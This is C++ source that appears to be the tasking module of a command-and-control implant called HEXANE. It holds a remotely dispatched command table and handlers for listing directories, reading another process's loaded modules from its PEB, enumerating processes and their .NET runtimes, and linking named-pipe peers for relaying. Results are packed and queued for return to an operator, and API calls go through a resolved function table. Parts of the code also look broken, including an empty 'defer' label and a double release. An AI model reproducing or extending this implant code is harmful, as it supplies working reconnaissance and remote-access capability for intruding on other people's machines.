#include <core/include/commands.hpp>
using namespace Peers;
using namespace Parser;
using namespace Stream;
using namespace Process;
using namespace Dispatcher;

namespace Commands {

    HASH_MAP
        __attribute__((used, section(".rdata"))) cmd_map[] = {
        { .name = DIRECTORYLIST, 	.address = (VOID*) Commands::DirectoryList        },
        { .name = PROCESSMODULES,   .address = (VOID*) Commands::ProcessModules       },
        { .name = PROCESSLIST,	    .address = (VOID*) Commands::ProcessList          },
        { .name = ADDPEER,		    .address = (VOID*) Commands::CommandAddPeer       },
        { .name = REMOVEPEER,		.address = (VOID*) Commands::CommandRemovePeer    },
        { .name = SHUTDOWN,		    .address = (VOID*) Commands::Shutdown             },
        { .name = 0,				.address = nullptr		                        },
    };

    VOID DirectoryList (PARSER *parser) {
        HEXANE;

        STREAM *out = CreateTaskResponse(DIRECTORYLIST);

        ULONG size = 0;
        HANDLE handle = nullptr;

        WIN32_FIND_DATAA head = { };
        ULARGE_INTEGER file_size = { };
        SYSTEMTIME access_time = { };
        SYSTEMTIME sys_time = { };

        const auto dir_string = UnpackString(parser, nullptr);
        const auto path_buffer = (CHAR*)Malloc(MAX_PATH);

        if (dir_string[0] == PERIOD) {
            if (!(size = ctx->win32.GetCurrentDirectoryA(MAX_PATH, path_buffer))) {
                // LOG ERROR
                goto defer;
            }

            if (path_buffer[size - 1] != BSLASH) {
                path_buffer[size++] = BSLASH;
            }

            path_buffer[size++] = ASTER;
            path_buffer[size] = NULTERM;
        }
        else {
            MemCopy(path_buffer, dir_string, MAX_PATH);
        }

        if ((handle = ctx->win32.FindFirstFileA(path_buffer, &head))) {
            do {
                if (!ctx->win32.FileTimeToSystemTime(&head.ftLastAccessTime, &access_time) ||
                    !ctx->win32.SystemTimeToTzSpecificLocalTime(nullptr, &access_time, &sys_time)) {
                    // LOG ERROR
                    goto defer;
                }

                if (head.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                    PackUint32(out, TRUE);
                } else {
                    file_size.HighPart   = head.nFileSizeHigh;
                    file_size.LowPart    = head.nFileSizeLow;

                    PackUint32(out, FALSE);
                    PackUint64(out, file_size.QuadPart);
                }

                PackUint32(out, access_time.wMonth);
                PackUint32(out, access_time.wDay);
                PackUint32(out, access_time.wYear);
                PackUint32(out, sys_time.wHour);
                PackUint32(out, sys_time.wMinute);
                PackUint32(out, sys_time.wSecond);
                PackString(out, head.cFileName);
            }
            while (ctx->win32.FindNextFileA(handle, &head) != 0);
        }
        else {
            // LOG ERROR
            goto defer;
        }

        MessageQueue(out);

        defer:
        if (handle) {
            ctx->win32.FindClose(handle);
        }
        if (path_buffer) {
            Free(path_buffer);
        }
    }

    VOID ProcessModules (PARSER *parser) {
        HEXANE;

        STREAM *out = CreateTaskResponse(PROCESSMODULES);

        LDR_DATA_TABLE_ENTRY mod = { };
        PROCESS_BASIC_INFORMATION pbi = { };

        PPEB_LDR_DATA loads = nullptr;
        PLIST_ENTRY head = nullptr;
        PLIST_ENTRY entry = nullptr;
        HANDLE process = nullptr;

        CHAR modname_a[MAX_PATH] = { };
        WCHAR modname_w[MAX_PATH] = { };

        UINT32 pid = 0;
        UINT32 count = 0;
        SIZE_T size = 0;

        x_assert(pid = GetProcessIdByName(UnpackString(parser, nullptr)));
        x_ntassert(NtOpenProcess(&process, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, pid));

        x_ntassert(ctx->win32.NtQueryInformationProcess(process, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), nullptr));
        x_ntassert(ctx->win32.NtReadVirtualMemory(process, &pbi.PebBaseAddress->Ldr, &loads, sizeof(PLDR_DATA_TABLE_ENTRY), &size));
        x_ntassert(ctx->win32.NtReadVirtualMemory(process, &loads->InMemoryOrderModuleList.Flink, &entry, sizeof(PLIST_ENTRY), nullptr));

        for (head = &loads->InMemoryOrderModuleList; entry != head; entry = mod.InMemoryOrderLinks.Flink) {
            x_ntassert(ctx->win32.NtReadVirtualMemory(process, CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks), &mod, sizeof(LDR_DATA_TABLE_ENTRY), nullptr));
            x_ntassert(ctx->win32.NtReadVirtualMemory(process, mod.FullDllName.Buffer, &modname_w, mod.FullDllName.Length, &size));
            x_assert(size == mod.FullDllName.Length);

            if (mod.FullDllName.Length > 0) {
                size = WcsToMbs(modname_a, modname_w, mod.FullDllName.Length);

                PackString(out, modname_a);
                PackPointer(out, mod.DllBase);
                count++;
            }

            MemSet(modname_w, 0, MAX_PATH);
            MemSet(modname_a, 0, MAX_PATH);
        }

        MessageQueue(out);
        defer:
    }

    VOID ProcessList() {
        HEXANE;

        STREAM *out = CreateTaskResponse(PROCESSLIST);
        PROCESSENTRY32 entries = { };

        HANDLE snapshot = nullptr;
        HANDLE process = nullptr;

        IEnumUnknown *enums = nullptr;
        ICLRMetaHost *meta = nullptr;
        ICLRRuntimeInfo *runtime = nullptr;

        WCHAR buffer[1024] = { };
        DWORD size = 0;

        size            = ARRAY_LEN(buffer);
        entries.dwSize  = sizeof(PROCESSENTRY32);

        x_assert(snapshot = ctx->win32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0));
        x_assert(ctx->win32.Process32First(snapshot, &entries));

        do {
            CLIENT_ID cid= { };
            cid.UniqueThread = nullptr;
            cid.UniqueProcess = (void*) entries.th32ProcessID;

            BOOL is_managed = false;
            BOOL is_loaded = false;

            OBJECT_ATTRIBUTES attr = { };
            InitializeObjectAttributes(&attr, nullptr, 0, nullptr, nullptr);

            x_ntassert(ctx->win32.NtOpenProcess(&process, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, &attr, &cid));
            x_ntassert(ctx->win32.CLRCreateInstance(X_GUID_CLSID_CLRMetaHost, X_GUID_IID_ICLRMetaHost, (void**) &meta));
            x_ntassert(meta->lpVtbl->EnumerateInstalledRuntimes(meta, &enums));

            while (S_OK == enums->Next(0x1, (IUnknown**) &runtime, nullptr)) {
                if (runtime->lpVtbl->IsLoaded(runtime, process, &is_loaded) == S_OK && is_loaded == TRUE) {

                    is_managed = true;
                    if (SUCCEEDED(runtime->lpVtbl->GetVersionString(runtime, buffer, &size))) {
                        PackUint32(out, entries.th32ProcessID);
                        PackString(out, entries.szExeFile);
                        PackWString(out, buffer);
                    }
                }
                runtime->lpVtbl->Release(runtime);
            }

            if (!is_managed) {
                PackUint32(out, entries.th32ProcessID);
                PackString(out, entries.szExeFile);
                PackWString(out, nullptr);
            }

            if (process) {
                ctx->win32.NtClose(process);
            }
            if (meta) {
                meta->lpVtbl->Release(meta);
            }
            if (runtime) {
                runtime->lpVtbl->Release(runtime);
            }
            if (enums) {
                enums->Release();
            }
        }

        while (ctx->win32.Process32Next(snapshot, &entries));

        MessageQueue(out);

        defer:
        if (snapshot) {
            ctx->win32.NtClose(snapshot);
        }
    }

    VOID CommandAddPeer(PARSER *parser) {

        auto pipe_name = UnpackWString(parser, nullptr);
        auto peer_id = UnpackUint32(parser);

        AddPeer(pipe_name, peer_id);
    }

    VOID CommandRemovePeer(PARSER *parser) {

        auto peer_id = UnpackUint32(parser);
        RemovePeer(peer_id);
    }

    VOID Shutdown(PARSER *parser) {
        HEXANE;

        // Send final message
        // Zero/Free all memory
        // Exit
        ntstatus = ERROR_EXIT;
    }

    UINT_PTR FindCommandAddress(CONST UINT32 name_id) {

        for (uint32 i = 0 ;; i++) {
            if (!cmd_map[i].name) {
                return 0;
            }

            if (cmd_map[i].name == name_id) {
                return U_PTR(cmd_map[i].address);
            }
        }
    }
}
